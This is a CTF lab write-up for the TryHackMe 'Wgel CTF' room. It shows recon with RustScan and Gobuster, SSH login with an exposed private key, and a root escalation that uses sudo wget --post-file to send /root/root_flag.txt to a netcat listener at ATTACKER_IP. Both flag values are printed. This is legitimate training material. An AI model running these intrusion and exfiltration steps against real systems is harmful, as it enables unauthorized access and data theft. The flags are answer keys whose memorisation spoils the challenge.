# Wgel CTF

Room: [https://tryhackme.com/room/wgelctf](https://tryhackme.com/room/wgelctf)

---

# Reconnaissance

First, I used **RustScan** to quickly identify open ports on the target machine.

```bash
./rustscan -a 10.48.190.118 --ulimit 5000
```

RustScan automatically runs an **Nmap scan** after discovering open ports.

### Open Ports

```
22/tcp open  ssh
80/tcp open  http
```

These results indicate:

* **SSH (22)** → Remote login access
* **HTTP (80)** → Web server

Since a web server was available, I began with **web enumeration**.

---

# Web Enumeration

Visiting the website and checking the **page source**, I found an interesting comment:

```html
<!-- Jessie don't forget to update the website -->
```

This suggests a possible **username:**

```
jessie
```

This may be useful later for **SSH access**.

---

# Directory Enumeration

Next, I used **Gobuster** to search for hidden directories.

```bash
gobuster dir -u http://10.48.190.118/ -w /usr/share/wordlists/dirb/common.txt
```

### Result

```
index.html
server-status (403)
sitemap (301)
```

The most interesting discovery was:

```
/sitemap
```

---

# Further Enumeration

Navigating to:

```
http://10.48.190.118/sitemap/
```

did not reveal anything interesting initially, so I ran **Gobuster again** on that directory.

```bash
gobuster dir -u http://10.48.190.118/sitemap/ -w /usr/share/wordlists/dirb/common.txt
```

### Result

```
.ssh
css
fonts
images
js
index.html
```

The most interesting directory discovered was:

```
/sitemap/.ssh
```

---

# SSH Key Discovery

Inside the `.ssh` directory:

```
http://10.48.190.118/sitemap/.ssh/
```

I found a file named:

```
id_rsa
```

This file contained an **RSA private key**.

---

# SSH Access

Using the discovered key and the previously identified username **jessie**, I attempted to log in via SSH.

```bash
ssh -i id_rsa jessie@10.48.190.118
```

Login was successful.

---

# User Flag

Once inside the system, I searched for the **user flag**.

```bash
find / -type f -name "*user*" 2>/dev/null
```

This revealed the file:

```
/home/jessie/Documents/user_flag.txt
```

Reading the file:

```bash
cat /home/jessie/Documents/user_flag.txt
```

### User Flag

```
057c67131c3d5e42dd5cd3075b198ff6
```

---

# Privilege Escalation

Next, I attempted to access the root directory.

```bash
cd /root
```

However, permission was denied.

To check for possible privilege escalation vectors, I ran:

```bash
sudo -l
```

### Output

```
User jessie may run the following commands on CorpOne:
(ALL : ALL) ALL
(root) NOPASSWD: /usr/bin/wget
```

This indicates that **wget can be executed as root without a password**.

---

# Root Flag

Since `wget` can send HTTP requests, it can be used to **exfiltrate files** from the system.

First, I set up a listener on my attacker machine:

```bash
nc -lvnp 9001
```

Then on the target machine, I executed:

```bash
sudo wget --post-file=/root/root_flag.txt http://ATTACKER_IP:9001
```

This sends the contents of `root_flag.txt` to my listener.

### Listener Output

```
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Content-Length: 33

b1b968b37519ad1daa6408188649263d
```

### Root Flag

```
b1b968b37519ad1daa6408188649263d
```

